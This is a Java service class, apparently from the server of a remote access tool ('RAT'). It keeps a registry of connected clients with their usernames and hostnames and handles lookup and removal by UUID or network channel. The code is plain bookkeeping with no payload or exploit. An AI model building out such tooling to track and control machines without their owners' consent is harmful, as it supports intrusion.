package ovh.wpkg.lskg.server.services;

import io.netty.channel.Channel;
import jakarta.inject.Singleton;
import lombok.extern.slf4j.Slf4j;
import ovh.wpkg.lskg.server.dto.RatClient;
import ovh.wpkg.lskg.server.dto.WtpClient;

import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

@Slf4j
@Singleton
public class ConnectedRatService {

    private final Map<UUID, RatClient> clients = new ConcurrentHashMap<>();

    public void addClient(RatClient client) {
        log.debug("Registered client {}, username={}, hostname={}",
                client.getUuid(), client.getUsername(), client.getHostname());
        clients.put(client.getUuid(), client);
    }

    public RatClient getByUUID(UUID uuid) {
        return clients.get(uuid);
    }

    public Map<UUID, RatClient> getRatsMap() {
        return clients;
    }

    public List<RatClient> getRatsList() {
        return clients.values().stream().toList();
    }

    public RatClient getByChannel(Channel channel) {
        return clients.values().stream()
                .filter(it -> it.getMasterClient().getChannel().equals(channel))
                .findFirst()
                .orElseThrow();
    }

    public boolean isClientRatByChannel(Channel channel) {
        return clients.values().stream()
                .anyMatch(it -> it.getMasterClient().getChannel().equals(channel));
    }

    public boolean isClientRatByWtp(WtpClient wtpClient) {
        return clients.values().stream()
                .anyMatch(it -> it.getMasterClient().id().equals(wtpClient.id()));
    }

    public void removeByUUID(UUID uuid) {
        clients.remove(uuid);
    }

    public void removeByWtpClient(WtpClient wtpClient) {
        clients.values().removeIf(client -> client.getMasterClient().id().equals(wtpClient.id()));
    }
}
